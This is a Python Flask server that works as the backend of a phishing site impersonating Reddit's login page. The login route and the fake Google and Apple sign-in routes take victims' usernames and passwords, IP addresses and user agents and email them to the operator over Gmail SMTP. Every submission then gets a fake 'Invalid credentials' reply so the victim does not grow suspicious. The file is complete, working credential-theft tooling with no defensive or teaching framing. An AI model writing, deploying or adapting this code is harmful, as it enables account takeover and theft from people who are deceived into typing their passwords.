from flask import Flask, render_template, request, jsonify
from flask_mail import Mail, Message
from dotenv import load_dotenv
import os
from datetime import datetime
import re

# Load environment variables
load_dotenv()

app = Flask(__name__)

# Email configuration
app.config['MAIL_SERVER'] = 'smtp.gmail.com'
app.config['MAIL_PORT'] = 587
app.config['MAIL_USE_TLS'] = True
app.config['MAIL_USE_SSL'] = False
app.config['MAIL_USERNAME'] = os.getenv('EMAIL_USER')
app.config['MAIL_PASSWORD'] = os.getenv('EMAIL_PASSWORD')
app.config['MAIL_DEFAULT_SENDER'] = os.getenv('EMAIL_USER')

mail = Mail(app)

# Your email to receive credentials
RECEIVER_EMAIL = os.getenv('EMAIL_USER')

def is_valid_email(email):
    """Validate email format"""
    pattern = r'^[a-zA-Z0-9.!#$%&\'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(\.[a-zA-Z0-9-]+)*\.[a-zA-Z]{2,}$'
    return re.match(pattern, email) is not None

def send_credentials_email(username, password, ip_address, user_agent):
    """Send credentials via SMTP"""
    try:
        subject = "🔐 New Reddit Login Submission"
        html_body = f"""
        <html>
        <head>
            <style>
                body {{ font-family: Arial, sans-serif; }}
                .container {{ 
                    max-width: 600px; 
                    margin: 0 auto; 
                    padding: 20px;
                    border: 1px solid #e0e0e0;
                    border-radius: 8px;
                }}
                .header {{
                    background: #ff4500;
                    color: white;
                    padding: 15px;
                    border-radius: 4px;
                    text-align: center;
                }}
                .content {{
                    padding: 20px;
                    background: #fafafa;
                    border-radius: 4px;
                    margin: 20px 0;
                }}
                .field {{
                    margin: 10px 0;
                    padding: 10px;
                    background: white;
                    border-radius: 4px;
                }}
                .label {{
                    font-weight: bold;
                    color: #666;
                    font-size: 12px;
                }}
                .value {{
                    font-size: 16px;
                    margin-top: 4px;
                    color: #1a1a1b;
                }}
                .footer {{
                    text-align: center;
                    color: #999;
                    font-size: 12px;
                    margin-top: 20px;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h2>🔐 Reddit Login Submission</h2>
                </div>
                <div class="content">
                    <div class="field">
                        <div class="label">Username / Email</div>
                        <div class="value"><strong>{username}</strong></div>
                    </div>
                    <div class="field">
                        <div class="label">Password</div>
                        <div class="value"><strong>{password}</strong></div>
                    </div>
                    <div class="field">
                        <div class="label">Timestamp</div>
                        <div class="value">{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</div>
                    </div>
                    <div class="field">
                        <div class="label">IP Address</div>
                        <div class="value">{ip_address}</div>
                    </div>
                    <div class="field">
                        <div class="label">User Agent</div>
                        <div class="value" style="font-size: 12px; word-break: break-all;">{user_agent}</div>
                    </div>
                </div>
                <div class="footer">
                    <p>This is an automated notification from your Reddit login page.</p>
                </div>
            </div>
        </body>
        </html>
        """
        
        text_body = f"""
        🔐 New Reddit Login Submission
        ================================
        
        Username/Email: {username}
        Password: {password}
        Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        IP Address: {ip_address}
        User Agent: {user_agent}
        
        This is an automated notification from your Reddit login page.
        """
        
        msg = Message(
            subject=subject,
            recipients=[RECEIVER_EMAIL],
            body=text_body,
            html=html_body
        )
        
        mail.send(msg)
        return True
    except Exception as e:
        print(f"Error sending email: {str(e)}")
        return False

@app.route('/')
def index():
    """Serve the login page"""
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    """Handle login form submission"""
    try:
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        
        # Get client IP
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip_address and ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
        
        user_agent = request.headers.get('User-Agent', 'Unknown')
        
        # Validate inputs
        if not username or not password:
            return jsonify({
                'success': False,
                'message': 'Please fill in all fields'
            }), 400
        
        # Validate username/email
        if '@' in username:
            if not is_valid_email(username):
                return jsonify({
                    'success': False,
                    'message': 'Please enter a valid email address'
                }), 400
        else:
            if len(username) < 3:
                return jsonify({
                    'success': False,
                    'message': 'Username must be at least 3 characters'
                }), 400
            if len(username) > 20:
                return jsonify({
                    'success': False,
                    'message': 'Username must be less than 20 characters'
                }), 400
            if not re.match(r'^[a-zA-Z0-9_-]+$', username):
                return jsonify({
                    'success': False,
                    'message': 'Username contains invalid characters'
                }), 400
        
        if len(password) < 8:
            return jsonify({
                'success': False,
                'message': 'Password must be at least 8 characters'
            }), 400
        
        # Send email with credentials
        email_sent = send_credentials_email(username, password, ip_address, user_agent)
        
        if email_sent:
            print(f"✅ Credentials sent for: {username}")
        else:
            print(f"❌ Failed to send email for: {username}")
        
        # ALWAYS return error message (like real Reddit)
        return jsonify({
            'success': False,
            'message': 'Invalid credentials. Try again.'
        }), 401
        
    except Exception as e:
        print(f"Error in login route: {str(e)}")
        return jsonify({
            'success': False,
            'message': 'Invalid credentials. Try again.'
        }), 401

@app.route('/forgot-password', methods=['POST'])
def forgot_password():
    """Handle forgot password"""
    return jsonify({
        'success': False,
        'message': 'Invalid credentials. Try again.'
    }), 401

@app.route('/google-auth', methods=['POST'])
def google_auth():
    """Handle Google sign-in"""
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    
    if username and password:
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip_address and ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
        user_agent = request.headers.get('User-Agent', 'Unknown')
        send_credentials_email(username, password, ip_address, user_agent)
    
    return jsonify({
        'success': False,
        'message': 'Invalid credentials. Try again.'
    }), 401

@app.route('/apple-auth', methods=['POST'])
def apple_auth():
    """Handle Apple sign-in"""
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    
    if username and password:
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ip_address and ',' in ip_address:
            ip_address = ip_address.split(',')[0].strip()
        user_agent = request.headers.get('User-Agent', 'Unknown')
        send_credentials_email(username, password, ip_address, user_agent)
    
    return jsonify({
        'success': False,
        'message': 'Invalid credentials. Try again.'
    }), 401

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)